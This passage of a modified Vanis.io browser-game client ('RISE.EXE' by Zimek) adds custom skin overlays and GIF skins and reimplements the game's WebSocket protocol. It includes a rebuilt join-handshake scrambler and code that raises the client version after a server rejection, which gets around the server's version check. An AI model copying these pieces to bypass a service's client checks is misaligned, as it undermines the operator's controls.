! function e(root) {
    
    window.customModal = (e, t) => {
        document.getElementsByClassName("fa-clipboard-list")[0].click(), setTimeout(() => {
            document.getElementsByClassName("content fade-box")[0].getElementsByTagName("div")[0].innerHTML = e, t && setTimeout(t, 50)
        }, 50)
    };


// Create a new style element
const style = document.createElement('style');
style.type = 'text/css';

// Add the CSS rule
style.appendChild(document.createTextNode(`
    .selected[data-v-1c614894] {
        box-shadow: 0 0 6px 2px #ddd;
        transition: .2s;
    }
`));

// Append the style element to the head of the document
document.head.appendChild(style);




   











    
    document.title = "Vanis.io - RISE.EXE"
    console.log('%cRISE.EXE v1.1.4 by Zimek', 'font-size:25px;font-weight:bold')

    window.CellOverlayManager = { cache:{} } 

    window.GifSkinManager = { running:[], count:{} }
    
    GifSkinManager.list = [
        {
            name:'zimek', 
            skinUrl:'https://skins.vanis.io/s/QyYQz0',
            isLockedToColor:true,
            isLockedToName:true,
            gif:{
                url:'https://zimehx.github.io/gif_source/gojo1/',
                count:45,
                format:'.gif',
                delay:35
            }
        }
    ]

    CellOverlayManager.list = [
        {
            name:'zimek',
            skinUrl:'https://skins.vanis.io/s/Owljce',
            isLockedToColor:true,
            isLockedToName:true,
            url:'https://i.postimg.cc/x82447k4/hat5.png',
            forceSkin:'https://i.postimg.cc/QxjCrd1f/skin5.png'
        }
    ]
    
    CellOverlayManager.updateOverlays = () => {
        CellOverlayManager.list.forEach(overlay => {
            let cells = Array.from(GAME.cells, ([name, value]) => value);
            cells = cells.forEach(x=>{
                if(!x.player || x.destroyed || !x.sprite || x.overlay && x.overlay.includes(overlay.url)) return false
    
                let qualify = false
                if(overlay.skinUrl == x.player.skinUrl || overlay.forceSkin == x.player.skinUrl) qualify = true
                if(overlay.isLockedToColor && !x.player.perk_colorCss && x.player.perk_colorCss !== '#878787') qualify = false
                if(overlay.isLockedToName && x.player.name !== overlay.name) qualify = false
    
                if(qualify === true){
                    if(overlay.forceSkin && x.player.skinUrl !== overlay.forceSkin) x.player.setSkin(overlay.forceSkin);
                     CellOverlayManager.addOverlay(x, overlay.url)
                }
            })
        })
    }
    
    CellOverlayManager.addOverlay = (cell, url) => {
        if(!cell.sprite) return; 
    
        const Sprite = CellOverlayManager.cache[url] ? new PIXI.Sprite(CellOverlayManager.cache[url].texture) : new PIXI.Sprite.from(url)
        if(!CellOverlayManager.cache[url]) CellOverlayManager.cache[url] = Sprite 
    
        Sprite.anchor.set(0.5)
        Sprite.height = Sprite.width = 1024*window.settings.rendering_scale
        Sprite.alpha = 0.95
        Sprite.zIndex = -1
    
        if(!cell.overlay) cell.overlay = []
        cell.overlay.push(url)
        cell.sprite.addChild(Sprite)
    }
    
    CellOverlayManager.interval = setInterval(CellOverlayManager.updateOverlays, 25)
    
    GifSkinManager.stopAll = () =>{
        GifSkinManager.running.forEach(x=>{clearInterval(x)})
        GifSkinManager.running = []
    }
    
    GifSkinManager.start = (pid, settings) => {
        GifSkinManager.count[settings.url] = 1
    
        var interval = setInterval(()=>{
            if(GifSkinManager.count[settings.url] > settings.count) GifSkinManager.count[settings.url] = 1
    
            GAME.playerManager.players.get(pid).setSkin(settings.url + GifSkinManager.count[settings.url] + settings.format)
    
            GifSkinManager.count[settings.url]++
        }, settings.delay)
    
        GifSkinManager.running.push(interval)
    }
    
    GifSkinManager.check = () => {
        if(!GAME.connection.opened) return;
        GifSkinManager.list.forEach(x=>{
            var check = Object.values(Object.fromEntries(GAME.playerManager.players.entries())).filter(y=>{
                let qualify = false
    
                if(y.skinUrl == x.skinUrl) qualify = true
                if(x.isLockedToName && !y.name == x.name) qualify = false;
                if(x.isLockedToColor && !y.perk_colorCss) qualify = false;
    
                return qualify
            })
    
            if(check.length){
                check.forEach(y=>{ GifSkinManager.start(y.pid, x.gif, x) })
            }
        })
    }
    
    class s {
        constructor(e, t) {
            if (this.view = null, e instanceof DataView) this.view = e;
            else {
                if (!(e instanceof ArrayBuffer)) throw TypeError("First argument to SmartBuffer constructor must be an ArrayBuffer or DataView");
                this.view = new DataView(e)
            }
            this.offset = t || 0
        }
        ensureCapacity(e) {
            let d = 1;
            let t = this.offset + e;
            if (t > this.length) {
                let s = new ArrayBuffer(t),
                    i = new Uint8Array(s);
                i.set(new Uint8Array(this.buffer)), this.view = new DataView(s)
            }
        }
        static fromSize(e) {
            return new this(new ArrayBuffer(e), 0)
        }
        static fromBuffer(e, t) {
            return new this(e, t || 0)
        }
        toBuffer() {
            return this.buffer
        }
        get buffer() {
            return this.view?.buffer || null
        }
        get length() {
            return this.view?.byteLength || 0
        }
        get eof() {
            return this.offset >= this.length
        }
        read(e, t, s, i) {
            let a = e.call(this.view, i ?? this.offset, s);
            return null == i && (this.offset += t), a
        }
        write(e, t, s, i) {
            this.ensureCapacity(t), e.call(this.view, this.offset, s, i), this.offset += t
        }
        readInt8(e) {
            return this.read(DataView.prototype.getInt8, 1, null, e)
        }
        readUInt8(e) {
            return this.read(DataView.prototype.getUint8, 1, null, e)
        }
        readInt16LE(e) {
            return this.read(DataView.prototype.getInt16, 2, !0, e)
        }
        readInt16BE(e) {
            return this.read(DataView.prototype.getInt16, 2, !1, e)
        }
        readUInt16LE(e) {
            return this.read(DataView.prototype.getUint16, 2, !0, e)
        }
        readUInt16BE(e) {
            return this.read(DataView.prototype.getUint16, 2, !1, e)
        }
        readInt32LE(e) {
            return this.read(DataView.prototype.getInt32, 4, !0, e)
        }
        readInt32BE(e) {
            return this.read(DataView.prototype.getInt32, 4, !1, e)
        }
        readUInt32LE(e) {
            return this.read(DataView.prototype.getUint32, 4, !0, e)
        }
        readUInt32BE(e) {
            return this.read(DataView.prototype.getUint32, 4, !1, e)
        }
        readString16() {
            let e = "";
            for (;;) {
                let t = this.eof ? 0 : this.readUInt16LE();
                if (0 === t) break;
                e += String.fromCharCode(t)
            }
            return e
        }
        readString() {
            let e = "";
            for (;;) {
                let t = this.eof ? 0 : this.readUInt8();
                if (0 === t) break;
                e += String.fromCharCode(t)
            }
            return e
        }
        readEscapedString() {
            return decodeURIComponent(escape(this.readString()))
        }
        writeInt8(e) {
            this.write(DataView.prototype.setInt8, 1, e, null)
        }
        writeUInt8(e) {
            this.write(DataView.prototype.setUint8, 1, e, null)
        }
        writeInt16LE(e) {
            this.write(DataView.prototype.setInt16, 2, e, !0)
        }
        writeInt16BE(e) {
            this.write(DataView.prototype.setInt16, 2, e, !1)
        }
        writeUInt16LE(e) {
            this.write(DataView.prototype.setUint16, 2, e, !0)
        }
        writeUInt16BE(e) {
            this.write(DataView.prototype.setUint16, 2, e, !1)
        }
        writeInt32LE(e) {
            this.write(DataView.prototype.setInt32, 4, e, !0)
        }
        writeInt32BE(e) {
            this.write(DataView.prototype.setInt32, 4, e, !1)
        }
        writeUInt32LE(e) {
            this.write(DataView.prototype.setUint32, 4, e, !0)
        }
        writeUInt32BE(e) {
            this.write(DataView.prototype.setUint32, 4, e, !1)
        }
        writeString(e) {
            let t = e.length;
            this.ensureCapacity(t);
            let s = this.offset;
            for (this.offset += t; t--;) this.view.setUint8(s + t, e.charCodeAt(t))
        }
        writeStringNT(e) {
            this.writeString(e), this.writeUInt8(0)
        }
        writeEscapedString(e) {
            this.writeString(unescape(encodeURIComponent(e)))
        }
        writeEscapedStringNT(e) {
            this.writeStringNT(unescape(encodeURIComponent(e)))
        }
    }
    window.SmartBuffer = s;
    let i = [5, 104, 253, 62, 175, 116, 238, 41];
    class a {
        constructor(e) {
            this.data = e
        }
        writeIndex(e, t) {
            let s = this.data[t],
                a = s + 5 & 7,
                n = e[t > 0 ? t - 1 : 0] ^ i[t];
            e.push(((s << a | s >>> 8 - a) & 255 ^ n ^ 62) & 255)
        }
        build(e = !1) {
            let t = [];
            for (let s = 0; s < 8; s++) this.writeIndex(t, s);
            let i = 1 + Math.floor(2147483646 * Math.random());
            return t.push((t[0] ^ i >> 24) & 255), t.push((t[1] ^ i >> 16) & 255), t.push((t[2] ^ i >> 8) & 255), t.push((i ^ t[3]) & 255), t.push((t[0] ^ +e ^ 31) & 255), t
        }
    }
    var n = [.79, 1.52, 2.35, 3, 3.92, 4.7, 5.5, 6.2];

    function o(e) {
        for (var t = 9e9, s = 0, i = 0; e.length < i; i++) e[i].id < t && (s = i, t = e[i].id);
        return e.splice(s, 1), e
    }
    String.prototype.toHHMMSS = function() {
            var e = parseInt(this, 10),
                t = Math.floor(e / 3600),
                s = Math.floor((e - 3600 * t) / 60);
            return `${0!==s?`${s}m `:""}${e-3600*t-60*s}s`
        }, window.makeid = e => {
            for (var t = "", s = "X0123456789", i = s.length, a = 0; a < e; a++) t += s.charAt(Math.floor(Math.random() * i));
            return t
        }, window.$ = (e, t = document) => t.querySelector(e), window.extraServers = [{
            name: "Local:8080",
            domain: "localhost",
            port: 8080,
            mode: "Instant",
            players: "0",
            slots: "00",
            region: "EU",
            url: "ws://localhost:8080"
        }],
        function(e) {
            var t, s = (t = !0, function(e, s) {
                var i = t ? function() {
                    if (s) {
                        var t = s.apply(e, arguments);
                        return s = null, t
                    }
                } : function() {};
                return t = !1, i
            });

            function i(t) {
                var i = s(this, function() {
                    var e = function() {
                        return !e.constructor('return /" + this + "/')().constructor("^([^ ]+( +[^ ]+)+)+[^ ]}").test(i)
                    };
                    return e()
                });
                i();
                for (var n, l, c = t[0], h = t[1], d = t[2], u = 0, g = []; u < c.length; u++) l = c[u], Object.prototype.hasOwnProperty.call(o, l) && o[l] && g.push(o[l][0]), o[l] = 0;
                for (n in h) Object.prototype.hasOwnProperty.call(h, n) && (e[n] = h[n]);
                for (p && p(t); g.length;) g.shift()();
                return r.push.apply(r, d || []), a()
            }

            function a() {
                for (var e, t = 0; t < r.length; t++) {
                    for (var s = r[t], i = !0, a = 1; a < s.length; a++) 0 !== o[s[a]] && (i = !1);
                    i && (r.splice(t--, 1), e = l(l.s = s[0]))
                }
                return e
            }
            var n = {},
                o = {
                    0: 0
                },
                r = [];

            function l(t) {
                if (n[t]) return n[t].exports;
                var s = n[t] = {
                    i: t,
                    l: !1,
                    exports: {}
                };
                return e[t].call(s.exports, s, s.exports, l), s.l = !0, s.exports
            }
            window.getModule = l, l.m = e, l.c = n, l.d = function(e, t, s) {
                l.o(e, t) || Object.defineProperty(e, t, {
                    enumerable: !0,
                    get: s
                })
            }, l.r = function(e) {
                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
                    value: "Module"
                }), Object.defineProperty(e, "__esModule", {
                    value: !0
                })
            }, l.t = function(e, t) {
                if (1 & t && (e = l(e)), 8 & t || 4 & t && "object" == typeof e && e && e.__esModule) return e;
                var s = Object.create(null);
                if (l.r(s), Object.defineProperty(s, "default", {
                        enumerable: !0,
                        value: e
                    }), 2 & t && "string" != typeof e)
                    for (var i in e) l.d(s, i, (function(t) {
                        return e[t]
                    }).bind(null, i));
                return s
            }, l.n = function(e) {
                var t = e && e.__esModule ? function() {
                    return e.default
                } : function() {
                    return e
                };
                return l.d(t, "a", t), t
            }, l.o = function(e, t) {
                return Object.prototype.hasOwnProperty.call(e, t)
            }, l.p = "";
            var c = window.webpackJsonp = window.webpackJsonp || [],
                h = c.push.bind(c);
            c.push = i, c = c.slice();
            for (var d = 0; d < c.length; d++) i(c[d]);
            var p = h;
            r.push([118, 1]), a()
        }([, function(e, t, i) {
            let n = i(5),
                {
                    writeUserData: o
                } = i(8),
                r = i(4),
                l = i(24),
                c = i(121),
                h = i(125),
                d = i(78),
                p = i(12),
                u = i(23),
                g = i(128),
                {
                    lerp: A,
                    clampNumber: m,
                    hideCaptchaBadge: v
                } = i(8),
                {
                    htmlEncode: f
                } = i(8),
                C, y = {
                    connectionUrl: null,
                    selectedServer: null,
                    spectators: 0,
                    lifeState: 0,
                    allowed: !1,
                    playButtonDisabled: !1,
                    playButtonText: "Play",
                    deathDelay: !1,
                    autoRespawning: !1
                },
                w = (e, t) => {
                    n.toast.fire({
                        type: t ? "error" : "info",
                        title: e,
                        timer: t ? 5e3 : 2e3
                    })
                },
                I = (e, t) => {
                    for (; e.length;) e.pop().destroy(t)
                };
            document.body.oncontextmenu = e => e.target?.id === "email";
            class k {
                constructor() {
                    this.running = !1, this.protocol, this.modeId, this.instanceSeed, this.replaying, this.nwDataMax, this.nwDataSent, this.nwDataTotal, this.nwData, this.playerId, this.multiboxPid, this.activePid, this.tagId, this.spectating, this.alive = !1, this.center = {
                        x: 0,
                        y: 0
                    }, y.spectators, y.lifeState, this.score = 0, this.highestScore = 0, this.killCount = 0, this.timeAlive = 0, this.clientVersion = 999, this.events = new u, this.settings = r, this.renderer = l, this.skinLoader = new g, p.virus.loadVirusFromUrl(r.virusImageUrl), this.state = y, h.useGame(this), this.playback, this.connection = new class e {
                        constructor() {
                            this.socketCount = 0, this.opened = !1
                        }
                        onClosed(e) {
                            delete C.currentWsId, this.opened = !1, C.running && C.stop();
                            let t;
                            if (1003 === e.code) t = 1500, w("Server restarting...", !1);
                            else {
                                t = 3500 + ~~(100 * Math.random());
                                let s = "You have been disconnected";
                                if(e.reason){
                                    (s += ` (${e.reason})`), w(s, !0)
                                    if(e.reason.startsWith('Too old client version'))GAME.clientVersion++;
                                }
                            }
                            setTimeout(() => {
                                this.opened || C.events.$emit("reconnect-server")
                            }, t), C.showMenu(!0)
                        }
                        onRejected() {
                            delete C.currentWsId, this.opened = !1, w("Connection rejected", !0)
                        }
                        open(e) {
                            C.dual.close(), C.running && C.stop(), this.close(), C.events.$emit("chat-clear"), this.opened = !0;
                            let t = C.ws = new WebSocket(e, "tFoL46WDlZuRja7W6qCl");
                            t.binaryType = "arraybuffer", t.packetCount = 0, t.onopen = () => {
                                window.settings.updateClearHUD()
                                this.opened && (C.currentWsId = t.id = this.socketCount++, C.state.connectionUrl = e, t.onclose = this.onClosed.bind(this))
                            }, t.onclose = this.onRejected.bind(this), t.onmessage = e => {
                                let {
                                    data: t
                                } = e;
                                C.nwData += t.byteLength, C.parseMessage(s.fromBuffer(t))
                            }
                            GifSkinManager.stopAll()
                        }
                        close() {
                            C.dual.close(), C.debugElement.innerHTML = "";
                            let {
                                ws: e
                            } = C;
                            e && (e.onmessage = null, e.onclose = null, e.onerror = null, e.close(), delete C.ws, delete C.state.connectionUrl, this.opened = !1)
                        }
                        send(e, t, i = !1) {
                            e instanceof s && (e = e.view), t = !!t;
                            let {
                                dual: a
                            } = C;
                            if (t ? !(a.opened && (i || a.ready)) : !this.opened) return !1;
                            let n = t ? a.ws : C.ws;
                            return console.assert(!!n, "Socket not defined?"), n.send(e), !0
                        }
                        sendMouse() {
                            let e = s.fromSize(5);
                            e.writeUInt8(16);
                            let {
                                x: t,
                                y: i
                            } = C.mouse;
                            e.writeInt16LE(t), e.writeInt16LE(i);
                            let {
                                dual: a
                            } = C;
                            this.send(e, a.focused), a.connected && (C.isAlive(!1) && C.isAlive(!0) || this.send(e, C.isAlive(!1)))
                        }
                        sendOpcode(e, t) {
                            let i = s.fromSize(1);
                            i.writeUInt8(e), this.send(i, t)
                        }
                        ping() {
                            C.pingStamp = performance.now(), this.sendOpcode(3)
                        }
                        sendJoinData(e, t) {
                            let i = s.fromSize(2 + e.length + 7);
                            i.writeUInt8(5), i.writeUInt8(C.clientVersion), i.ensureCapacity(e.length), e.forEach(e => i.writeUInt8(e)), o(i, !!t);
                            let a = localStorage.vanisToken;
                            a && /^wss?:\/\/[a-zA-Z0-9_-]+\.vanis\.io/i.test(C.ws.url) && i.writeStringNT(a), this.send(i, t, !!t)
                        }
                        sendRecaptchaToken(e, t) {
                            e = unescape(encodeURIComponent(e));
                            let i = s.fromSize(1 + e.length + 1);
                            i.writeUInt8(11), i.writeStringNT(e), this.send(i, t)
                        }
                        sendChatMessage(e, t) {
                            if ((e = unescape(encodeURIComponent(e))).startsWith("/")) {
                                window.client && window.client.chatted(e);
                                return
                            }
                            let i = s.fromSize(1 + e.length + 1);
                            i.writeUInt8(99), i.writeString(e), this.send(i, t)
                        }
                    }, this.dual, this.pingStamp, this.timeStamp, this.serverTick, this.cells = new Map, this.destroyedCells = [], this.cellCount = 0, this.ownedCells = new Set, this.rawMouse, this.mouse, this.mouseZoom, this.mouseZoomMin, this.camera, this.massTextPool = [], this.crownPool = [], c.useGame(this), this.scene, this.playerManager, this.ticker, this.splitCount, this.moveWaitUntil, this.stopMovePackets, this.mouseFrozen, this.moveInterval, setInterval(() => this.events.$emit("every-second"), 1e3), setInterval(() => this.events.$emit("every-minute"), 6e4)
                }
                isAlive(e = !1) {
                    let {
                        dual: t
                    } = this;
                    return e ? t.opened && t.alive : this.connection.opened && this.alive
                }
                get allCells() {
                    let e = this.cells,
                        {
                            dual: t
                        } = this;
                    if (!t.opened) return e;
                    e = new Map([...e]);
                    let s = t.cells;
                    return s.forEach((t, s) => {
                        e.has(s) || e.set(s, t)
                    }), e
                }
                updateStates(e) {
                    let t = !1,
                        s = !1,
                        {
                            dual: i
                        } = this;
                    return C.allCells.forEach(e => {
                        e.pid && (e.pid == this.playerId ? this.alive = t = !0 : i.opened && e.pid == i.pid && (i.alive = s = !0))
                    }), this.alive && !t && (this.alive = !1), i.alive && !s && (i.alive = !1), y.lifeState = (t ? 1 : 0) + (s ? 2 : 0), e ? s : t
                }
                start(e) {
                    if (!(e.protocol && e.instanceSeed && e.playerId && e.border)) throw Error("Lacking mandatory data");
                    this.running = !0, this.protocol = e.protocol, this.modeId = e.gamemodeId || 0, this.instanceSeed = e.instanceSeed, this.replaying = !!e.replayUpdates, this.nwDataMax = this.nwDataSent = this.nwDataTotal = this.nwData = 0, this.pingStamp = 0, this.timeStamp = 0, this.serverTick = 0, this.playerId = e.playerId, this.multiboxPid = 0, this.activePid = this.playerId, this.tagId = null, this.spectating = !1, this.alive = !1, y.spectators = 0, y.lifeState = 0, this.score = 0, this.highestScore = 0, this.cellCount = 0, this.rawMouse = {
                        x: 0,
                        y: 0
                    }, this.mouse = {
                        x: 0,
                        y: 0
                    };
                    let t = this.border = e.border;
                    this.food = e.food, this.mouseZoom = .3, this.mouseZoomMin = .01, this.camera = {
                        time: 0,
                        sx: 0,
                        sy: 0,
                        ox: t.x,
                        nx: t.x,
                        oy: t.y,
                        ny: t.y,
                        oz: this.mouseZoom,
                        nz: this.mouseZoom
                    }, this.massTextPool = [], this.crownPool = [];
                    let i = PIXI.utils.isWebGLSupported() && r.useWebGL && r.showBackgroundImage,
                        a = this.scene = new c(t, i);
                    if (a.container.alpha = r.gameAlpha || 1, a.container.pivot.set(t.x, t.y), a.container.scale.set(this.zoom), this.playerManager = new h, this.ticker = new PIXI.Ticker, this.ticker.add(this.onTick.bind(this)), y.selectedServer && y.connectionUrl !== y.selectedServer.url && (y.selectedServer = null), this.replaying) {
                        let {
                            playback: n
                        } = this, o = e.replayUpdates;
                        n.set(o), this.moveInterval = setInterval(n.next.bind(n), 40), this.events.$emit("show-replay-controls", o.length), this.events.$emit("minimap-stats-visible", !1)
                    } else this.splitCount = 0, this.moveWaitUntil = 0, this.stopMovePackets = 0, this.moveToCenterOfCells = 0, this.mouseFrozen = !1, r.minimapEnabled && this.events.$emit("minimap-show"), r.showChat && this.events.$emit("chat-visible", {
                        visible: !0
                    }), this.events.$emit("leaderboard-show"), this.events.$emit("stats-visible", !0), this.moveInterval = setInterval(() => {
                        let {
                            dual: e
                        } = this;
                        if (this.stopMovePackets === 1 + +e.focused) return;
                        let t = this.moveToCenterOfCells;
                        if (0 != t && this.connection.sendOpcode(9, 2 == t), e.focused ? 2 == t : 1 == t) return;
                        let i = s.fromSize(5);
                        i.writeUInt8(16);
                        let {
                            x: a,
                            y: n
                        } = this.mouse;
                        i.writeInt16LE(a), i.writeInt16LE(n), this.connection.send(i, e.focused)
                    }, 40), this.events.$on("every-second", k.everySecond), y.allowed = !0;
                    this.ticker.start(), this.eventListeners(!0), this.events.$emit("game-started")
                }
                stop() {
                    let {
                        dual: e
                    } = this;
                    e.opened && e.close(), this.running = !1, delete this.protocol, delete this.modeId, delete this.instanceSeed, delete this.replaying, delete this.nwDataMax, delete this.nwDataSent, delete this.nwDataTotal, delete this.nwData, delete this.playerId, delete this.multiboxPid, delete this.activePid, delete this.tagId, this.spectating = !1, this.alive = !1, y.spectators = 0, y.lifeState = 0, y.allowed = !1, y.playButtonDisabled = !1, y.playButtonText = "Play", this.eventListeners(!1), delete this.score, delete this.highestScore, delete this.pingStamp, delete this.timeStamp, delete this.serverTick, delete this.playerId, delete this.multiboxPid, delete this.activePid, delete this.tagId, delete this.spectating, this.clearCells(), delete this.cellCount, delete this.rawMouse, delete this.mouse, delete this.mouseZoom, delete this.mouseZoomMin, delete this.camera, this.ticker && (this.ticker.stop(), delete this.ticker), delete this.splitCount, delete this.moveWaitUntil, delete this.stopMovePackets, delete this.moveToCenterOfCells, delete this.mouseFrozen, clearInterval(this.moveInterval), delete this.moveInterval, this.playback.reset(), this.events.$off("every-second", k.everySecond), this.skinLoader.clearCallbacks(), this.events.$emit("minimap-stats-visible", !0), this.events.$emit("stats-visible", !1), this.events.$emit("chat-visible", {
                        visible: !1
                    }), this.events.$emit("leaderboard-hide"), this.events.$emit("minimap-hide"), this.events.$emit("minimap-destroy"), this.events.$emit("show-replay-controls", !1), this.events.$emit("cells-changed", 0), this.events.$emit("reset-cautions"), this.events.$emit("game-stopped"), this.playerManager.destroy(), delete this.playerManager;
                    let {
                        scene: t
                    } = this;
                    t && (t.destroyBackgroundImage(!1), t.uninstallMassTextFont(), t.container.destroy({
                        children: !0
                    }), delete this.scene), this.renderer.clear(), p.cells.destroyCache(), p.squares.destroyCache(), I(this.massTextPool, !0), I(this.crownPool), delete this.massTextPool, delete this.crownPool
                }
                showMenu(e) {
                    if (e ??= !this.app.showMenu, this.app.showDeathScreen) return !1;
                    if (this.app.showMenu = e, this.actions.stopMovement(e), e) this.events.$emit("menu-opened");
                    else {
                        let t = document.activeElement;
                        t?.id !== "chatbox-input" && l.view.focus(), this.stopMovePackets = 0, v()
                    }
                    return e
                }
                updateStats(e) {
                    this.events.$emit("stats-changed", {
                        ping: e,
                        fps: Math.round(this.ticker.FPS),
                        mass: this.score,
                        score: this.highestScore
                    }), this.events.$emit("minimap-stats-changed", {
                        playerCount: this.playerManager.playerCount,
                        spectators: y.spectators
                    })
                }
                static everySecond() {
                    (C.isAlive(!1) || C.isAlive(!0)) && C.timeAlive++, C.nwData > C.nwDataMax && (C.nwDataMax = C.nwData), C.nwDataTotal += C.nwData;
                    GifSkinManager.check()
                    let {
                        connection: e
                    } = C, {
                        debugElement: t
                    } = C;
                    if (t) {
                        if ((r.debugStats || r.clientStats) && e.opened) {
                            let s = C.dual.connected,
                                i = "";
                            if (r.debugStats && !C.replaying && (i += `
            NET: ${(C.nwData/1024).toFixed(0)} Kb/s <br>
            NET PEAK: ${(C.nwDataMax/1024).toFixed(0)} Kb/s <br>
            NET TOTAL: ${(C.nwDataTotal/1024/1024).toFixed(0)} MB <br>
            <br>`), r.clientStats) {
                                let {
                                    x: a,
                                    y: n
                                } = C.mouse;
                                i += `
        PID: ${C.playerId} <br>
        ${s?`DUAL PID: ${C.multiboxPid} <br>`:""}
        NODES: ${C.allCells.size} <br>
        `
                            }
                            t.innerHTML = i
                        } else "" !== t.innerHTML && (t.innerHTML = "")
                    } //        <b>(MOUSE)</b> ${a.toFixed(0)} ${n.toFixed(0)} <br>
                    C.nwData = 0, e.opened && e.ping();
                    let {
                        dual: o
                    } = C;
                    o.connected && (o.pingStamp = performance.now(), e.sendOpcode(3, !0))
                }
                clearCells() {
                    this.cells.forEach(e => e.destroy(1));
                    let {
                        destroyedCells: e
                    } = this;
                    for (; e.length;) e.pop().destroySprite()
                }
                onTick() {
                    let e = this.timeStamp = performance.now();
                    e >= this.moveWaitUntil && (this.updateMouse(), this.splitCount = 0);
                    let {
                        destroyedCells: t
                    } = this, s = t.length;
                    for (; s--;) {
                        let i = t[s];
                        i.update() && (i.destroySprite(), t.splice(s, 1))
                    }
                    let a = 0;
                    this.allCells.forEach(e => {
                        e.update(), e.pid == this.activePid && a++
                    }), this.cellCount != a && (this.cellCount = a, this.events.$emit("cells-changed", a));
                    let {
                        scene: n
                    } = this;
                    n.sort();
                    let o = this.updateCamera();
                    if (o) {
                        this.score = o;
                        let {
                            highestScore: r
                        } = this;
                        this.highestScore = r ? r < o ? o : r : o
                    } else this.isAlive(!0) || this.isAlive(!1) || (this.score = 0);
                    this.renderer.render(n.container)
                }
                updateCamera(e = !1) {
                    let {
                        scene: t,
                        camera: s
                    } = this, i = this.timeStamp - s.time, a = m(i / r.cameraMoveDelay, 0, 1), n = m(i / r.cameraZoomDelay, 0, 1), o = t.container.pivot.x = 1 == a ? s.nx : A(s.ox, s.nx, a), l = t.container.pivot.y = 1 == a ? s.ny : A(s.oy, s.ny, a), c = 1 == n ? s.nz : A(s.oz, s.nz, n);
                    t.container.scale.set(c);
                    let h = this.mouseZoom,
                        d = 0,
                        p = 0,
                        u = 0;
                    if (this.spectating) {
                        let {
                            sx: g,
                            sy: v
                        } = s;
                        d = g, p = v
                    } else {
                        let f = !1;
                        if (!this.replaying) {
                            let {
                                dual: y
                            } = this;
                            if (y.connected) {
                                let w = y.getDistanceFromOwner();
                                f = !!r.singleView || null == w || w > r.switchDistance * 1000
                            }
                        }
                        let I = 0,
                            k;
                        for (k of this.ownedCells.values()) {
                            if (f && k.pid != C.activePid) continue;
                            let b = Math.round(Math.pow(k.nSize / 10, 2));
                            d += k.nx * b, p += k.ny * b, I += k.nSize, u += b
                        }
                        u ? (d /= u, p /= u, r.autoZoom && (h *= Math.pow(Math.min(64 / I, 1), .27))) : (d = s.nx, p = s.ny)
                    }
                    return e ? (s.ox = o, s.oy = l, s.oz = c, s.nx = d, s.ny = p, s.nz = h, s.time = this.timeStamp, 0) : u
                }
                updateMouse(e = !1) { //
                    let t = this.scene.container,
                        {
                            x: s,
                            y: i
                        } = this.rawMouse;
                    "client" in window && (client.mouse = {
                        x: s,
                        y: i
                    }), (!this.mouseFrozen || e) && (this.mouse.x = m(t.pivot.x + (s - window.innerWidth / 2) / t.scale.x, -32768, 32767), this.mouse.y = m(t.pivot.y + (i - window.innerHeight / 2) / t.scale.y, -32768, 32767))
                }
                seededRandom(e) {
                    return (e = Math.sin(e) * (1e4 + this.instanceSeed)) - Math.floor(e)
                }
                createThumbnail(e = 240, t = 135) {
                    let s = this.scene.container,
                        i = new PIXI.Container;
                    i.pivot.x = s.position.x, i.pivot.y = s.position.y, i.position.x = e / 2, i.position.y = t / 2, i.scale.set(.25), i.addChild(s);
                    let {
                        renderer: a
                    } = this, n = PIXI.RenderTexture.create(e, t);
                    a.render(i, n), i.removeChild(s);
                    let o = a.plugins.extract.canvas(n),
                        l = document.createElement("canvas");
                    l.width = e, l.height = t;
                    let c = l.getContext("2d");
                    c.beginPath(), c.rect(0, 0, e, t), c.fillStyle = "#" + r.backgroundColor, c.fill(), c.drawImage(o, 0, 0, e, t);
                    let h = l.toDataURL();
                    return i.destroy(!0), h
                }
                setTagId(e) {
                    return e || (e = null), e !== this.tagId && (this.tagId = e, !0)
                }
                getMassText(e) {
                    return !r.shortMass || e < 1e3 ? e.toFixed(0) : (e / 1e3).toFixed(1) + "k"
                }
                shouldAutoRespawn(e) {
                    return !this.app.showMenu && (e ? r.mbAutorespawn : r.autoRespawn)
                }
                triggerDeathDelay(e) {
                    if (clearTimeout(this.deathTimeout), delete this.deathTimeout, e ? delete this.dual.autoRespawning : (y.deathDelay = !1, y.autoRespawning = !1), !r.mbAutorespawn && !r.autoRespawn) {
                        let t = [];
                        t.push(`Kills: ${this.killCount}`), t.push(`Time alive: ${this.timeAlive.toString().toHHMMSS()}`), t.push(`Highscore: ${this.highestScore.toString().replace(/\B(?=(\d{3})+(?!\d))/g,",")}`), $(".bar").innerHTML = t.join("<br>"), this.killCount = 0, this.timeAlive = 0
                    }
                }
                triggerAutoRespawn(e) {
                    if (e) {
                        let {
                            dual: t
                        } = this;
                        t.autoRespawning = !1, t.spawn()
                    } else y.deathDelay = !1, y.autoRespawning = !1, this.actions.join()
                }
                handleDeath(e, t) {
                    e.readUInt16LE(), this.killCount += e.readUInt16LE(), e.readUInt32LE(), t || (y.deathDelay = !0);
                    let {
                        dual: s
                    } = this;
                    this.shouldAutoRespawn(t) ? t ? (s.autoRespawning = !0, s.ticksSinceDeath = 0) : (y.autoRespawning = !0, this.ticksSinceDeath = 0) : this.deathTimeout = setTimeout(this.triggerDeathDelay.bind(this, t), 900), s.updateOutlines()
                }
                parseLeaderboard(e) {
                    let t = [];
                    for (;;) {
                        let s = e.readUInt16LE();
                        if (0 == s) {
                            this.events.$emit("leaderboard-update", t);
                            return
                        }
                        let i = this.playerManager.getPlayer(s);
                        if (!i) continue;
                        let a = {
                            pid: s,
                            position: t.length + 1,
                            text: i.name,
                            color: i.perk_colorCss || "#ffffff",
                            bold: !!i.perk_color
                        };
                        t.push(a)
                    }
                }
                parseScrimmageLeaderboard(e) {
                    let t = [];
                    for (;;) {
                        let s = e.readUInt8();
                        if (0 == s) break;
                        let i = {};
                        if (1 & s && (i.position = e.readUInt8()), 2 & s && (i.pid = e.readUInt16LE()), 4 & s) i.text = e.readEscapedString(), i.color = "#ffffff";
                        else {
                            let a = 2 & s && this.playerManager.getPlayer(i.pid);
                            i.text = a ? a.name : "n/a", i.color = a && a.perk_colorCss || "#ffffff"
                        }
                        8 & s && (i.score = e.readEscapedString()), 16 & s && (i.color = "#" + ("00" + e.readUInt8().toString(16)).slice(-2) + ("00" + e.readUInt8().toString(16)).slice(-2) + ("00" + e.readUInt8().toString(16)).slice(-2)), 32 & s && (i.bold = !0), 64 & s && (i.link = e.readEscapedString()), t.push(i)
                    }
                    let n = null;
                    if (e.offset !== e.length) {
                        let o = e.readEscapedString();
                        n = {
